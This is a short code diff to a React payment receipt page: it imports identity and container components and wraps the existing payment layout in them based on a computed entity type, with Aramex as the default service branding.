@@ -5,6 +5,8 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash } from "lucide-react";
+import { DynamicIdentity, EntityContainer } from "@/components/DynamicIdentity";
+import { getPaymentEntityType } from "@/lib/paymentEntityHelper";
 
 const PaymentReceiptPage = () => {
   const { id } = useParams();
@@ -15,6 +17,9 @@ const PaymentReceiptPage = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  
+  // Determine entity type
+  const entityType = linkData ? getPaymentEntityType(linkData) : 'local_payment';
   const shippingInfo = linkData?.payload as Record<string, unknown>;
 
   // Get amount from link data - ensure it's a number, handle all data types
@@ -60,6 +65,8 @@ const PaymentReceiptPage = () => {
   };
   
   return (
+    <DynamicIdentity entityType={entityType}>
+      <EntityContainer entityType={entityType} useBackgroundImage={false}>
     <DynamicPaymentLayout
       serviceName={serviceName}
       serviceKey={serviceKey}
@@ -195,6 +202,8 @@ const PaymentReceiptPage = () => {
         سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
       </p>
     </DynamicPaymentLayout>
+      </EntityContainer>
+    </DynamicIdentity>
   );
 };
 
